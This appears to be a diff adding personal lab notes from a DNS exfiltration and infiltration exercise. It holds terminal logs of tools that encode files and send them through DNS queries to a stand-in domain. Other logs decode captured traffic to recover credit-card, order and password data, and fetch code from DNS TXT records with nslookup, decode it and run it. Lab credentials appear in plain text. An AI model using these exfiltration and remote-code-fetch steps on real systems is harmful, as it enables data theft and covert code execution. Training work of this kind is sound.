@@ -1,0 +1,68 @@
+Date:Apr/08/2021
+Time:20:43
+
+└─$ python3 packety.py                                                    2 ⚙
+Filename: securecorp.txt
+Domain Name (Example: badbaddoma.in): badbaddoma.in
+[+] Reading file.
+[+] Base64 encoded.
+[+] Base58 encoded.
+Start transmitting... [PRESS ENTER KEY]
+Done.%
+
+└─$ python3 packetyGrabber.py                                             2 ⚙
+File captured: cap-credit-cards.pcap
+Filename output: credit-cards.txt
+Domain Name (Example: badbaddoma.in): badbaddoma.in
+[+] Domain Name set to badbaddoma.in
+[+] Filtering for your domain name.
+[+] Base58 decoded.
+[+] Base64 decoded.
+[+] Output to credit-cards.txt
+
+ssh:-
+Username: user
+Password: P@ssword01
+
+user@user1:~/challenges/exfiltration/orderlist$ python3 ../../../dns-exfil-infil/packetyGrabber.py order.pcap 
+File captured: order.pcap
+Filename output: order.txt
+Domain Name (Example: badbaddoma.in): badbaddoma.in
+user@user1:~/challenges/exfiltration/orderlist$ cat order.txt 
+DATE	ORDER-ID	TRANSACTION	PRICE	   CODE
+01-06	   1		Network Equip.	$2349.99    -
+01-09	   2		Software Licen. $1293.49    -
+01-11	   3		Physical Secur.	$7432.79    -
+02-06	   4		SENT TO #1056..	$15040.23   -
+02-06	   5		1M THM VOUCHER  $10	   zSiSeC
+02-06	   6		Firewall	$2500
+
+user@user1:~/challenges/exfiltration/identify$ python3 ../../../dns-exfil-infil/packetyGrabber.py cap3.pcap 
+File captured: cap3.pcap
+Filename output: cap.txt
+Domain Name (Example: badbaddoma.in): badbaddoma.in
+user@user1:~/challenges/exfiltration/identify$ cat cap.txt
+administrator:s3cre7P@ssword
+
+└─$ nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py
+└─$ cat .mal.py         
+ZaWacwbdHbMAXM3mKfuuteadPrzQfd26pcJFPxyEGNq1Ckq4ZaBKJjPe8Byq
+└─$ nano packetySimple.py                                                   
+https://github.com/kleosdc/dns-exfil-infil
+└─$ python3 packetySimple.py
+Filename: .mal.py
+└─$ cat .mal.py
+while True: print("maLwAre CoDe")
+
+
+this was so hard 
+user@user1:~/challenges/infiltration$ nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .malware.py
+user@user1:~/challenges/infiltration$ python3 ~/dns-exfil-infil/packetySimple.py
+Filename: .malware.py
+[+] Reading from file...
+[+] Base58 decoded.
+[+] Base64 decoded.
+[+] Done, .malware.py is decoded.
+user@user1:~/challenges/infiltration$ cat .malware.py
+import os; print(os.uname()[2])user@user1:~/challenges/infiltration$ python3 .malware.py
+4.4.0-186-generic
